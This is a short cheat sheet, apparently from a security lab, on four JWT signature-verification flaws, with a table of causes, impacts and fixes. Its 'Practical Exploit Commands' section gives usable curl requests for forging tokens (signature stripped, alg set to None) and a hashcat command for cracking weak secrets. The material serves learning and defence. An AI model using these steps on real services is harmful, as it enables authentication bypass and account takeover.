
## JWT Signature Verification Vulnerabilities

| Vulnerability | Cause | Impact | Fix |
|---------------|-------|--------|-----|
| **No Signature Verification** | Signature check skipped on some/all endpoints | Modify claims (e.g., `admin=1`) without detection | Always verify with secret/public key |
| **Algorithm Downgrade to `None`** | `alg` not restricted, allows `None` | Signature bypass, forge any claims | Lock allowed algorithms (`["HS256","HS384","HS512"]`) |
| **Weak Symmetric Secrets** | Low-entropy secret in HS* algorithms | Secret cracked offline (Hashcat, John) | Use long, random, high-entropy secrets |
| **Signature Algorithm Confusion** | Both HS* & RS* allowed without checks | Downgrade RS256 → HS256, use public key as secret | Separate handling for symmetric/asymmetric |

### Practical Exploit Commands

**No Signature Verification**
```bash
# Authenticate and get JWT
curl -H 'Content-Type: application/json' \
  -X POST -d '{ "username": "user", "password": "password2" }' \
  http://10.10.222.69/api/v1.0/example2

# Use JWT with signature removed (keep trailing dot)
curl -H 'Authorization: Bearer <JWT_HEADER>.<JWT_PAYLOAD>.' \
  http://10.10.222.69/api/v1.0/example2?username=user
```

**Algorithm Downgrade to None**
```bash
# Edit alg in JWT header to "None" (CyberChef: URL-Safe Base64)
# Then send altered token
curl -H 'Authorization: Bearer <MODIFIED_JWT>' \
  http://target/api
```

**Weak Symmetric Secret**
```bash
# Crack secret with Hashcat
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
```
